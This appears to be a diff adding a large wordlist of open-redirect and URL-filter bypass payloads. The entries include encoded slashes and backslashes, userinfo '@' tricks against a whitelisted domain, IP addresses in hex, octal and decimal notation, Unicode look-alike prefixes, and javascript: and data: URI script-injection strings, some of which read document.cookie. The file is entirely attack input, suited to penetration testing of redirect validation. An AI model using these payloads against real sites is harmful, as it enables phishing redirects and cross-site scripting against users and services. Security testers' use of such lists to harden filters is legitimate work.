+///example.com/%2e%2e
+///example.com/%2e%2e%2f
+///example.com/%2f%2e%2e
+///example.com/%2f..
+///example.com//
+//example.com
+//example.com/
+//example.com/%2e%2e
+//example.com/%2e%2e%2f
+//example.com/%2f%2e%2e
+//example.com/%2f..
+//example.com//
+//google%00.com
+//google%E3%80%82com
+//https:///example.com/%2e%2e
+//https://example.com/%2e%2e%2f
+//https://example.com//
+/<>//example.com
+/?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com&redirect_uri=//example.com
+/?url=/\/example.com&next=/\/example.com&redirect=/\/example.com&redirect_uri=/\/example.com
+/?url=Https://example.com&next=Https://example.com&redirect=Https://example.com&redir=Https://example.com&rurl=Https://example.com&redirect_uri=Https://example.com
+/\/\/example.com/
+/\/example.com/
+/example.com/%2f%2e%2e
+/http://%67%6f%6f%67%6c%65%2e%63%6f%6d
+/http://example.com
+/http:/example.com
+/https:/%5cexample.com/
+/https://%09/example.com
+/https://%5cexample.com
+/https:///example.com/%2e%2e
+/https:///example.com/%2f%2e%2e
+/https://example.com
+/https://example.com/
+/https://example.com/%2e%2e
+/https://example.com/%2e%2e%2f
+/https://example.com/%2f%2e%2e
+/https://example.com/%2f..
+/https://example.com//
+/https:example.com
+/redirect?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com&redirect_uri=//example.com
+/redirect?url=/\/example.com&next=/\/example.com&redirect=/\/example.com&redir=/\/example.com&rurl=/\/example.com&redirect_uri=/\/example.com
+/redirect?url=Https://example.com&next=Https://example.com&redirect=Https://example.com&redir=Https://example.com&rurl=Https://example.com&redirect_uri=Https://example.com
+
+//%2fxgoogle.com
+/ReceiveAutoRedirect/false?desiredLocationUrl=http://xssposed.org
+//localdomain.pw/%2f..
+//www.whitelisteddomain.tld@localdomain.pw/%2f..
+///localdomain.pw/%2f..
+///www.whitelisteddomain.tld@localdomain.pw/%2f..
+////localdomain.pw/%2f..
+////www.whitelisteddomain.tld@localdomain.pw/%2f..
+https://localdomain.pw/%2f..
+https://www.whitelisteddomain.tld@localdomain.pw/%2f..
+/https://localdomain.pw/%2f..
+/https://www.whitelisteddomain.tld@localdomain.pw/%2f..
+//localdomain.pw/%2f%2e%2e
+//www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
+///localdomain.pw/%2f%2e%2e
+///www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
+////localdomain.pw/%2f%2e%2e
+////www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
+https://localdomain.pw/%2f%2e%2e
+https://www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
+/https://localdomain.pw/%2f%2e%2e
+/https://www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
+//localdomain.pw/
+//www.whitelisteddomain.tld@localdomain.pw/
+///localdomain.pw/
+///www.whitelisteddomain.tld@localdomain.pw/
+////localdomain.pw/
+////www.whitelisteddomain.tld@localdomain.pw/
+https://localdomain.pw/
+https://www.whitelisteddomain.tld@localdomain.pw/
+/https://localdomain.pw/
+/https://www.whitelisteddomain.tld@localdomain.pw/
+//localdomain.pw//
+//www.whitelisteddomain.tld@localdomain.pw//
+///localdomain.pw//
+///www.whitelisteddomain.tld@localdomain.pw//
+////localdomain.pw//
+////www.whitelisteddomain.tld@localdomain.pw//
+https://localdomain.pw//
+https://www.whitelisteddomain.tld@localdomain.pw//
+//https://localdomain.pw//
+//https://www.whitelisteddomain.tld@localdomain.pw//
+//localdomain.pw/%2e%2e%2f
+//www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f
+///localdomain.pw/%2e%2e%2f
+///www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f
+////localdomain.pw/%2e%2e%2f
+////www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f
+https://localdomain.pw/%2e%2e%2f
+https://www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f
+//https://localdomain.pw/%2e%2e%2f
+//https://www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f
+///localdomain.pw/%2e%2e
+///www.whitelisteddomain.tld@localdomain.pw/%2e%2e
+////localdomain.pw/%2e%2e
+////www.whitelisteddomain.tld@localdomain.pw/%2e%2e
+https:///localdomain.pw/%2e%2e
+https:///www.whitelisteddomain.tld@localdomain.pw/%2e%2e
+//https:///localdomain.pw/%2e%2e
+//www.whitelisteddomain.tld@https:///localdomain.pw/%2e%2e
+/https://localdomain.pw/%2e%2e
+/https://www.whitelisteddomain.tld@localdomain.pw/%2e%2e
+///localdomain.pw/%2f%2e%2e
+///www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
+////localdomain.pw/%2f%2e%2e
+////www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
+https:///localdomain.pw/%2f%2e%2e
+https:///www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
+/https://localdomain.pw/%2f%2e%2e
+/https://www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
+/https:///localdomain.pw/%2f%2e%2e
+/https:///www.whitelisteddomain.tld@localdomain.pw/%2f%2e%2e
+/%09/localdomain.pw
+/%09/www.whitelisteddomain.tld@localdomain.pw
+//%09/localdomain.pw
+//%09/www.whitelisteddomain.tld@localdomain.pw
+///%09/localdomain.pw
+///%09/www.whitelisteddomain.tld@localdomain.pw
+////%09/localdomain.pw
+////%09/www.whitelisteddomain.tld@localdomain.pw
+https://%09/localdomain.pw
+https://%09/www.whitelisteddomain.tld@localdomain.pw
+/%5clocaldomain.pw
+/%5cwww.whitelisteddomain.tld@localdomain.pw
+//%5clocaldomain.pw
+//%5cwww.whitelisteddomain.tld@localdomain.pw
+///%5clocaldomain.pw
+///%5cwww.whitelisteddomain.tld@localdomain.pw
+////%5clocaldomain.pw
+////%5cwww.whitelisteddomain.tld@localdomain.pw
+https://%5clocaldomain.pw
+https://%5cwww.whitelisteddomain.tld@localdomain.pw
+/https://%5clocaldomain.pw
+/https://%5cwww.whitelisteddomain.tld@localdomain.pw
+https://localdomain.pw
+https://www.whitelisteddomain.tld@localdomain.pw
+javascript:alert(1);
+javascript:alert(1)
+//javascript:alert(1);
+/javascript:alert(1);
+//javascript:alert(1)
+/javascript:alert(1)
+/%5cjavascript:alert(1);
+/%5cjavascript:alert(1)
+//%5cjavascript:alert(1);
+//%5cjavascript:alert(1)
+/%09/javascript:alert(1);
+/%09/javascript:alert(1)
+java%0d%0ascript%0d%0a:alert(0)
+//localdomain.pw
+https:localdomain.pw
+//localdomain%E3%80%82pw
+\/\/localdomain.pw/
+/\/localdomain.pw/
+/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
+//localdomain%00.pw
+https://www.whitelisteddomain.tld/https://localdomain.pw/
+";alert(0);//
+javascript://www.whitelisteddomain.tld?%a0alert%281%29
+http://0xd8.0x3a.0xd6.0xce
+http://www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce
+http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
+http://XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
+http://0xd83ad6ce
+http://www.whitelisteddomain.tld@0xd83ad6ce
+http://3H6k7lIAiqjfNeN@0xd83ad6ce
+http://XY>.7d8T\205pZM@0xd83ad6ce
+http://3627734734
+http://www.whitelisteddomain.tld@3627734734
+http://3H6k7lIAiqjfNeN@3627734734
+http://XY>.7d8T\205pZM@3627734734
+http://472.314.470.462
+http://www.whitelisteddomain.tld@472.314.470.462
+http://3H6k7lIAiqjfNeN@472.314.470.462
+http://XY>.7d8T\205pZM@472.314.470.462
+http://0330.072.0326.0316
+http://www.whitelisteddomain.tld@0330.072.0326.0316
+http://3H6k7lIAiqjfNeN@0330.072.0326.0316
+http://XY>.7d8T\205pZM@0330.072.0326.0316
+http://00330.00072.0000326.00000316
+http://www.whitelisteddomain.tld@00330.00072.0000326.00000316
+http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
+http://XY>.7d8T\205pZM@00330.00072.0000326.00000316
+http://[::216.58.214.206]
+http://www.whitelisteddomain.tld@[::216.58.214.206]
+http://3H6k7lIAiqjfNeN@[::216.58.214.206]
+http://XY>.7d8T\205pZM@[::216.58.214.206]
+http://[::ffff:216.58.214.206]
+http://www.whitelisteddomain.tld@[::ffff:216.58.214.206]
+http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
+http://XY>.7d8T\205pZM@[::ffff:216.58.214.206]
+http://0xd8.072.54990
+http://www.whitelisteddomain.tld@0xd8.072.54990
+http://3H6k7lIAiqjfNeN@0xd8.072.54990
+http://XY>.7d8T\205pZM@0xd8.072.54990
+http://0xd8.3856078
+http://www.whitelisteddomain.tld@0xd8.3856078
+http://3H6k7lIAiqjfNeN@0xd8.3856078
+http://XY>.7d8T\205pZM@0xd8.3856078
+http://00330.3856078
+http://www.whitelisteddomain.tld@00330.3856078
+http://3H6k7lIAiqjfNeN@00330.3856078
+http://XY>.7d8T\205pZM@00330.3856078
+http://00330.0x3a.54990
+http://www.whitelisteddomain.tld@00330.0x3a.54990
+http://3H6k7lIAiqjfNeN@00330.0x3a.54990
+http://XY>.7d8T\205pZM@00330.0x3a.54990
+http:0xd8.0x3a.0xd6.0xce
+http:www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce
+http:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
+http:XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
+http:0xd83ad6ce
+http:www.whitelisteddomain.tld@0xd83ad6ce
+http:3H6k7lIAiqjfNeN@0xd83ad6ce
+http:XY>.7d8T\205pZM@0xd83ad6ce
+http:3627734734
+http:www.whitelisteddomain.tld@3627734734
+http:3H6k7lIAiqjfNeN@3627734734
+http:XY>.7d8T\205pZM@3627734734
+http:472.314.470.462
+http:www.whitelisteddomain.tld@472.314.470.462
+http:3H6k7lIAiqjfNeN@472.314.470.462
+http:XY>.7d8T\205pZM@472.314.470.462
+http:0330.072.0326.0316
+http:www.whitelisteddomain.tld@0330.072.0326.0316
+http:3H6k7lIAiqjfNeN@0330.072.0326.0316
+http:XY>.7d8T\205pZM@0330.072.0326.0316
+http:00330.00072.0000326.00000316
+http:www.whitelisteddomain.tld@00330.00072.0000326.00000316
+http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
+http:XY>.7d8T\205pZM@00330.00072.0000326.00000316
+http:[::216.58.214.206]
+http:www.whitelisteddomain.tld@[::216.58.214.206]
+http:3H6k7lIAiqjfNeN@[::216.58.214.206]
+http:XY>.7d8T\205pZM@[::216.58.214.206]
+http:[::ffff:216.58.214.206]
+http:www.whitelisteddomain.tld@[::ffff:216.58.214.206]
+http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
+http:XY>.7d8T\205pZM@[::ffff:216.58.214.206]
+http:0xd8.072.54990
+http:www.whitelisteddomain.tld@0xd8.072.54990
+http:3H6k7lIAiqjfNeN@0xd8.072.54990
+http:XY>.7d8T\205pZM@0xd8.072.54990
+http:0xd8.3856078
+http:www.whitelisteddomain.tld@0xd8.3856078
+http:3H6k7lIAiqjfNeN@0xd8.3856078
+http:XY>.7d8T\205pZM@0xd8.3856078
+http:00330.3856078
+http:www.whitelisteddomain.tld@00330.3856078
+http:3H6k7lIAiqjfNeN@00330.3856078
+http:XY>.7d8T\205pZM@00330.3856078
+http:00330.0x3a.54990
+http:www.whitelisteddomain.tld@00330.0x3a.54990
+http:3H6k7lIAiqjfNeN@00330.0x3a.54990
+http:XY>.7d8T\205pZM@00330.0x3a.54990
+〱localdomain.pw
+〵localdomain.pw
+ゝlocaldomain.pw
+ーlocaldomain.pw
+ｰlocaldomain.pw
+/〱localdomain.pw
+/〵localdomain.pw
+/ゝlocaldomain.pw
+/ーlocaldomain.pw
+/ｰlocaldomain.pw
+%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
+http://%67%6f%6f%67%6c%65%2e%63%6f%6d
+<>javascript:alert(1);
+<>//localdomain.pw
+//localdomain.pw\@www.whitelisteddomain.tld
+https://:@localdomain.pw\@www.whitelisteddomain.tld
+\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
+\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
+ja\nva\tscript\r:alert(1)
+\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
+\152\141\166\141\163\143\162\151\160\164\072alert(1)
+http://localdomain.pw:80#@www.whitelisteddomain.tld/
+http://localdomain.pw:80?@www.whitelisteddomain.tld/
+http://3H6k7lIAiqjfNeN@www.whitelisteddomain.tld+@localdomain.pw/
+http://XY>.7d8T\205pZM@www.whitelisteddomain.tld+@localdomain.pw/
+http://3H6k7lIAiqjfNeN@www.whitelisteddomain.tld@localdomain.pw/
+http://XY>.7d8T\205pZM@www.whitelisteddomain.tld@localdomain.pw/
+http://www.whitelisteddomain.tld+&@localdomain.pw#+@www.whitelisteddomain.tld/
+http://localdomain.pw\twww.whitelisteddomain.tld/
+//localdomain.pw:80#@www.whitelisteddomain.tld/
+//localdomain.pw:80?@www.whitelisteddomain.tld/
+//3H6k7lIAiqjfNeN@www.whitelisteddomain.tld+@localdomain.pw/
+//XY>.7d8T\205pZM@www.whitelisteddomain.tld+@localdomain.pw/
+//3H6k7lIAiqjfNeN@www.whitelisteddomain.tld@localdomain.pw/
+//XY>.7d8T\205pZM@www.whitelisteddomain.tld@localdomain.pw/
+//www.whitelisteddomain.tld+&@localdomain.pw#+@www.whitelisteddomain.tld/
+//localdomain.pw\twww.whitelisteddomain.tld/
+//;@localdomain.pw
+http://;@localdomain.pw
+@localdomain.pw
+javascript://https://www.whitelisteddomain.tld/?z=%0Aalert(1)
+data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
+http://localdomain.pw%2f%2f.www.whitelisteddomain.tld/
+http://localdomain.pw%5c%5c.www.whitelisteddomain.tld/
+http://localdomain.pw%3F.www.whitelisteddomain.tld/
+http://localdomain.pw%23.www.whitelisteddomain.tld/
+http://www.whitelisteddomain.tld:80%40localdomain.pw/
+http://www.whitelisteddomain.tld%2elocaldomain.pw/
+/x:1/:///%01javascript:alert(document.cookie)/
+/https:/%5clocaldomain.pw/
+javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
+/http://localdomain.pw
+/%2f%2flocaldomain.pw
+/localdomain.pw/%2f%2e%2e
+/http:/localdomain.pw
+/.localdomain.pw
+http://.localdomain.pw
+.localdomain.pw
+///\;@localdomain.pw
+///localdomain.pw
+/////localdomain.pw/
+/////localdomain.pw
+java%0ascript:alert(1)
+java%09script:alert(1)
+java%0dscript:alert(1)
+javascript://%0aalert(1)
+Javas%26%2399;ript:alert(1)
+data:www.whitelisteddomain.tld;text/html;charset=UTF-8,<html><script>document.write(document.domain);</script><iframe/src=xxxxx>aaaa</iframe></html>
+jaVAscript://www.whitelisteddomain.tld//%0d%0aalert(1);//
+http://www.localdomain.pw\.www.whitelisteddomain.tld
+%19Jav%09asc%09ript:https%20://www.whitelisteddomain.tld/%250Aconfirm%25281%2529
+//example.com@google.com/%2f..
+///google.com/%2f..
+///example.com@google.com/%2f..
+////google.com/%2f..
+////example.com@google.com/%2f..
+https://google.com/%2f..
+https://example.com@google.com/%2f..
+/https://google.com/%2f..
+/https://example.com@google.com/%2f..
+//google.com/%2f%2e%2e
+//example.com@google.com/%2f%2e%2e
+///google.com/%2f%2e%2e
+///example.com@google.com/%2f%2e%2e
+////google.com/%2f%2e%2e
+////example.com@google.com/%2f%2e%2e
+https://google.com/%2f%2e%2e
+https://example.com@google.com/%2f%2e%2e
+/https://google.com/%2f%2e%2e
+/https://example.com@google.com/%2f%2e%2e
+//google.com/
+//example.com@google.com/
+///google.com/
+///example.com@google.com/
+////google.com/
+////example.com@google.com/
+https://google.com/
+https://example.com@google.com/
+/https://google.com/
+/https://example.com@google.com/
+//google.com//
+//example.com@google.com//
+///google.com//
+///example.com@google.com//
+////google.com//
+////example.com@google.com//
+https://google.com//
+https://example.com@google.com//
+//https://google.com//
+//https://example.com@google.com//
+//google.com/%2e%2e%2f
+//example.com@google.com/%2e%2e%2f
+///google.com/%2e%2e%2f
+///example.com@google.com/%2e%2e%2f
+////google.com/%2e%2e%2f
+////example.com@google.com/%2e%2e%2f
+https://google.com/%2e%2e%2f
+https://example.com@google.com/%2e%2e%2f
+//https://google.com/%2e%2e%2f
+//https://example.com@google.com/%2e%2e%2f
+///google.com/%2e%2e
+///example.com@google.com/%2e%2e
+////google.com/%2e%2e
+////example.com@google.com/%2e%2e
+https:///google.com/%2e%2e
+https:///example.com@google.com/%2e%2e
+//https:///google.com/%2e%2e
+//example.com@https:///google.com/%2e%2e
+/https://google.com/%2e%2e
+/https://example.com@google.com/%2e%2e
+///google.com/%2f%2e%2e
+///example.com@google.com/%2f%2e%2e
+////google.com/%2f%2e%2e
+////example.com@google.com/%2f%2e%2e
+https:///google.com/%2f%2e%2e
+https:///example.com@google.com/%2f%2e%2e
+/https://google.com/%2f%2e%2e
+/https://example.com@google.com/%2f%2e%2e
+/https:///google.com/%2f%2e%2e
+/https:///example.com@google.com/%2f%2e%2e
+/%09/google.com
+/%09/example.com@google.com
+//%09/google.com
+//%09/example.com@google.com
+///%09/google.com
+///%09/example.com@google.com
+////%09/google.com
+////%09/example.com@google.com
+https://%09/google.com
+https://%09/example.com@google.com
+/%5cgoogle.com
+/%5cexample.com@google.com
+//%5cgoogle.com
+//%5cexample.com@google.com
+///%5cgoogle.com
+///%5cexample.com@google.com
+////%5cgoogle.com
+////%5cexample.com@google.com
+https://%5cgoogle.com
+https://%5cexample.com@google.com
+/https://%5cgoogle.com
+/https://%5cexample.com@google.com
+https://google.com
+https://example.com@google.com
+javascript:alert(1);
+javascript:alert(1)
+//javascript:alert(1);
+/javascript:alert(1);
+//javascript:alert(1)
+/javascript:alert(1)
+/%5cjavascript:alert(1);
+/%5cjavascript:alert(1)
+//%5cjavascript:alert(1);
+//%5cjavascript:alert(1)
+/%09/javascript:alert(1);
+/%09/javascript:alert(1)
+java%0d%0ascript%0d%0a:alert(0)
+//google.com
+https:google.com
+//google%E3%80%82com
+\/\/google.com/
+/\/google.com/
+//google%00.com
+https://example.com/https://google.com/
+";alert(0);//
+javascript://example.com?%a0alert%281%29
+http://0xd8.0x3a.0xd6.0xce
+http://example.com@0xd8.0x3a.0xd6.0xce
+http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
+http://XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
+http://0xd83ad6ce
+http://example.com@0xd83ad6ce
+http://3H6k7lIAiqjfNeN@0xd83ad6ce
+http://XY>.7d8T\205pZM@0xd83ad6ce
+http://3627734734
+http://example.com@3627734734
+http://3H6k7lIAiqjfNeN@3627734734
+http://XY>.7d8T\205pZM@3627734734
+http://472.314.470.462
+http://example.com@472.314.470.462
+http://3H6k7lIAiqjfNeN@472.314.470.462
+http://XY>.7d8T\205pZM@472.314.470.462
+http://0330.072.0326.0316
+http://example.com@0330.072.0326.0316
+http://3H6k7lIAiqjfNeN@0330.072.0326.0316
+http://XY>.7d8T\205pZM@0330.072.0326.0316
+http://00330.00072.0000326.00000316
+http://example.com@00330.00072.0000326.00000316
+http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
+http://XY>.7d8T\205pZM@00330.00072.0000326.00000316
+http://[::216.58.214.206]
+http://example.com@[::216.58.214.206]
+http://3H6k7lIAiqjfNeN@[::216.58.214.206]
+http://XY>.7d8T\205pZM@[::216.58.214.206]
+http://[::ffff:216.58.214.206]
+http://example.com@[::ffff:216.58.214.206]
+http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
+http://XY>.7d8T\205pZM@[::ffff:216.58.214.206]
+http://0xd8.072.54990
+http://example.com@0xd8.072.54990
+http://3H6k7lIAiqjfNeN@0xd8.072.54990
+http://XY>.7d8T\205pZM@0xd8.072.54990
+http://0xd8.3856078
+http://example.com@0xd8.3856078
+http://3H6k7lIAiqjfNeN@0xd8.3856078
+http://XY>.7d8T\205pZM@0xd8.3856078
+http://00330.3856078
+http://example.com@00330.3856078
+http://3H6k7lIAiqjfNeN@00330.3856078
+http://XY>.7d8T\205pZM@00330.3856078
+http://00330.0x3a.54990
+http://example.com@00330.0x3a.54990
+http://3H6k7lIAiqjfNeN@00330.0x3a.54990
+http://XY>.7d8T\205pZM@00330.0x3a.54990
+http:0xd8.0x3a.0xd6.0xce
+http:example.com@0xd8.0x3a.0xd6.0xce
+http:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
+http:XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
+http:0xd83ad6ce
+http:example.com@0xd83ad6ce
+http:3H6k7lIAiqjfNeN@0xd83ad6ce
+http:XY>.7d8T\205pZM@0xd83ad6ce
+http:3627734734
+http:example.com@3627734734
+http:3H6k7lIAiqjfNeN@3627734734
+http:XY>.7d8T\205pZM@3627734734
+http:472.314.470.462
+http:example.com@472.314.470.462
+http:3H6k7lIAiqjfNeN@472.314.470.462
+http:XY>.7d8T\205pZM@472.314.470.462
+http:0330.072.0326.0316
+http:example.com@0330.072.0326.0316
+http:3H6k7lIAiqjfNeN@0330.072.0326.0316
+http:XY>.7d8T\205pZM@0330.072.0326.0316
+http:00330.00072.0000326.00000316
+http:example.com@00330.00072.0000326.00000316
+http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316
+http:XY>.7d8T\205pZM@00330.00072.0000326.00000316
+http:[::216.58.214.206]
+http:example.com@[::216.58.214.206]
+http:3H6k7lIAiqjfNeN@[::216.58.214.206]
+http:XY>.7d8T\205pZM@[::216.58.214.206]
+http:[::ffff:216.58.214.206]
+http:example.com@[::ffff:216.58.214.206]
+http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]
+http:XY>.7d8T\205pZM@[::ffff:216.58.214.206]
+http:0xd8.072.54990
+http:example.com@0xd8.072.54990
+http:3H6k7lIAiqjfNeN@0xd8.072.54990
+http:XY>.7d8T\205pZM@0xd8.072.54990
+http:0xd8.3856078
+http:example.com@0xd8.3856078
+http:3H6k7lIAiqjfNeN@0xd8.3856078
+http:XY>.7d8T\205pZM@0xd8.3856078
+http:00330.3856078
+http:example.com@00330.3856078
+http:3H6k7lIAiqjfNeN@00330.3856078
+http:XY>.7d8T\205pZM@00330.3856078
+http:00330.0x3a.54990
+http:example.com@00330.0x3a.54990
+http:3H6k7lIAiqjfNeN@00330.0x3a.54990
+http:XY>.7d8T\205pZM@00330.0x3a.54990
+〱google.com
+〵google.com
+ゝgoogle.com
+ーgoogle.com
+ｰgoogle.com
+/〱google.com
+/〵google.com
+/ゝgoogle.com
+/ーgoogle.com
+/ｰgoogle.com
+%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
+http://%67%6f%6f%67%6c%65%2e%63%6f%6d
+<>javascript:alert(1);
+<>//google.com
+//google.com\@example.com
+https://:@google.com\@example.com
+\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
+\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
+ja\nva\tscript\r:alert(1)
+\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
+\152\141\166\141\163\143\162\151\160\164\072alert(1)
+http://google.com:80#@example.com/
+http://google.com:80?@example.com/
+http://3H6k7lIAiqjfNeN@example.com+@google.com/
+http://XY>.7d8T\205pZM@example.com+@google.com/
+http://3H6k7lIAiqjfNeN@example.com@google.com/
+http://XY>.7d8T\205pZM@example.com@google.com/
+http://example.com+&@google.com#+@example.com/
+http://google.com\texample.com/
+//google.com:80#@example.com/
+//google.com:80?@example.com/
+//3H6k7lIAiqjfNeN@example.com+@google.com/
+//XY>.7d8T\205pZM@example.com+@google.com/
+//3H6k7lIAiqjfNeN@example.com@google.com/
+//XY>.7d8T\205pZM@example.com@google.com/
+//example.com+&@google.com#+@example.com/
+//google.com\texample.com/
+//;@google.com
+http://;@google.com
+@google.com
+javascript://https://example.com/?z=%0Aalert(1)
+data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
+http://google.com%2f%2f.example.com/
+http://google.com%5c%5c.example.com/
+http://google.com%3F.example.com/
+http://google.com%23.example.com/
+http://example.com:80%40google.com/
+http://example.com%2egoogle.com/
+/x:1/:///%01javascript:alert(document.cookie)/
+/https:/%5cgoogle.com/
+javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
+/http://google.com
+/%2f%2fgoogle.com
+/google.com/%2f%2e%2e
+/http:/google.com
+/.google.com
+///\;@google.com
+///google.com
+/////google.com/
+
+=============================================================================================================================================== swiss key = unique + edit
+/?#www.malicious.site
+//google.com/%2f..
+//www.whitelisteddomain.tld@google.com/%2f..
+///google.com/%2f..
+///www.whitelisteddomain.tld@google.com/%2f..
+////google.com/%2f..
+////www.whitelisteddomain.tld@google.com/%2f..
+https://google.com/%2f..
+https://www.whitelisteddomain.tld@google.com/%2f..
+/https://google.com/%2f..
+/https://www.whitelisteddomain.tld@google.com/%2f..
+//www.google.com/%2f%2e%2e
+//www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+///www.google.com/%2f%2e%2e
+///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+////www.google.com/%2f%2e%2e
+////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+https://www.google.com/%2f%2e%2e
+https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+/https://www.google.com/%2f%2e%2e
+/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+//google.com/
+//www.whitelisteddomain.tld@google.com/
+///google.com/
+///www.whitelisteddomain.tld@google.com/
+////google.com/
+////www.whitelisteddomain.tld@google.com/
+https://google.com/
+https://www.whitelisteddomain.tld@google.com/
+/https://google.com/
+/https://www.whitelisteddomain.tld@google.com/
+//google.com//
+//www.whitelisteddomain.tld@google.com//
+///google.com//
+///www.whitelisteddomain.tld@google.com//
+////google.com//
+////www.whitelisteddomain.tld@google.com//
+https://google.com//
+https://www.whitelisteddomain.tld@google.com//
+//https://google.com//
+//https://www.whitelisteddomain.tld@google.com//
+//www.google.com/%2e%2e%2f
+//www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
+///www.google.com/%2e%2e%2f
+///www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
+////www.google.com/%2e%2e%2f
+////www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
+https://www.google.com/%2e%2e%2f
+https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
+//https://www.google.com/%2e%2e%2f
+//https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
+///www.google.com/%2e%2e
+///www.whitelisteddomain.tld@www.google.com/%2e%2e
+////www.google.com/%2e%2e
+////www.whitelisteddomain.tld@www.google.com/%2e%2e
+https:///www.google.com/%2e%2e
+https:///www.whitelisteddomain.tld@www.google.com/%2e%2e
+//https:///www.google.com/%2e%2e
+//www.whitelisteddomain.tld@https:///www.google.com/%2e%2e
+/https://www.google.com/%2e%2e
+/https://www.whitelisteddomain.tld@www.google.com/%2e%2e
+///www.google.com/%2f%2e%2e
+///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+////www.google.com/%2f%2e%2e
+////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+https:///www.google.com/%2f%2e%2e
+https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+/https://www.google.com/%2f%2e%2e
+/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+/https:///www.google.com/%2f%2e%2e
+/https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
+/%09/google.com
+/%09/www.whitelisteddomain.tld@google.com
+//%09/google.com
+//%09/www.whitelisteddomain.tld@google.com
+///%09/google.com
+///%09/www.whitelisteddomain.tld@google.com
+////%09/google.com
+////%09/www.whitelisteddomain.tld@google.com
+https://%09/google.com
+https://%09/www.whitelisteddomain.tld@google.com
+/%5cgoogle.com
+/%5cwww.whitelisteddomain.tld@google.com
+//%5cgoogle.com
+//%5cwww.whitelisteddomain.tld@google.com
+///%5cgoogle.com
+///%5cwww.whitelisteddomain.tld@google.com
+////%5cgoogle.com
+////%5cwww.whitelisteddomain.tld@google.com
+https://%5cgoogle.com
+https://%5cwww.whitelisteddomain.tld@google.com
+/https://%5cgoogle.com
+/https://%5cwww.whitelisteddomain.tld@google.com
+https://google.com
+https://www.whitelisteddomain.tld@google.com
+javascript:alert(1);
+javascript:alert(1)
+//javascript:alert(1);
+/javascript:alert(1);
+//javascript:alert(1)
+/javascript:alert(1)
+/%5cjavascript:alert(1);
+/%5cjavascript:alert(1)
+//%5cjavascript:alert(1);
+//%5cjavascript:alert(1)
+/%09/javascript:alert(1);
+/%09/javascript:alert(1)
+java%0d%0ascript%0d%0a:alert(0)
+//google.com
+https:google.com
+//google%E3%80%82com
+\/\/google.com/
+/\/google.com/
+//google%00.com
+https://www.whitelisteddomain.tld/https://www.google.com/
+";alert(0);//
+javascript://www.whitelisteddomain.tld?%a0alert%281%29
+http://0xd8.0x3a.0xd6.0xce
+http://www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce
+http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
+http://XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
+http://0xd83ad6ce
+http://www.whitelisteddomain.tld@0xd83ad6ce
+http://3H6k7lIAiqjfNeN@0xd83ad6ce
+http://XY>.7d8T\205pZM@0xd83ad6ce
+http://3627734734
+http://www.whitelisteddomain.tld@3627734734
+http://3H6k7lIAiqjfNeN@3627734734
